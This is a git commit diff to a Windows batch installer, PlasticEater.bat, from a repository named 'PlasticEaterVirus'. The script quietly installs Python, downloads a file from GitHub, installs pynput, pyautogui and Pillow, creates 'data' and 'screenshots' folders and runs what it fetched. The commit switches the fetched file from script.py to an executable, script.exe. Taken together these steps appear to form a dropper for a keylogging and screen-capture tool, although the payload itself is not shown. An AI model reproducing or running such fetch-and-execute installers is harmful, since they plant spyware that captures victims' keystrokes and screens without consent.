71467882626bce9d5f09b7100cca8009e6aa5bcf
ETML-Midicix <119678382+ETML-Midicix@users.noreply.github.com>
2024-06-14 10:56:42 +0200

    Add files via upload

--- Program/PlasticEater.bat
+++ Program/PlasticEater.bat
@@ -2,15 +2,12 @@
 cd C:\PlasticEater
 curl https://www.python.org/ftp/python/3.12.3/python-3.12.3-amd64.exe -o pythonInstaller.exe -s
 pythonInstaller.exe /quiet
-curl https://raw.githubusercontent.com/ETML-Midicix/PlasticEaterVirus/main/Program/script.py -L -O -s
+curl https://raw.githubusercontent.com/ETML-Midicix/PlasticEaterVirus/main/Program/script.exe -L -O -s
 TIMEOUT /T 5 /nobreak
-@REM py -m pip install --upgrade pynput --quiet
-@REM py -m pip install --upgrade pyautogui --quiet
-@REM py -m pip install --upgrade Pillow --quiet
 py -m pip install --upgrade pynput
 py -m pip install --upgrade pyautogui
 py -m pip install --upgrade Pillow
 mkdir data
 mkdir screenshots
-py script.py
+script.exe
 pause
